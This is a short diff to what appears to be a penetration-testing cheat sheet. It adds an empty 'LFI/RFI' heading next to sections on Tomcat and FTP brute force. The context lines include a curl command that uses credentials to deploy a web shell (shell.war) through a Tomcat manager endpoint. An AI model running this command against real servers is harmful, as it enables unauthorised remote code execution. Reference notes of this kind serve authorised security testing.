@@ -56,6 +56,8 @@
 
 <code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
 
+### LFI/RFI
+
 ## FTP 
 
 ### Brute Force
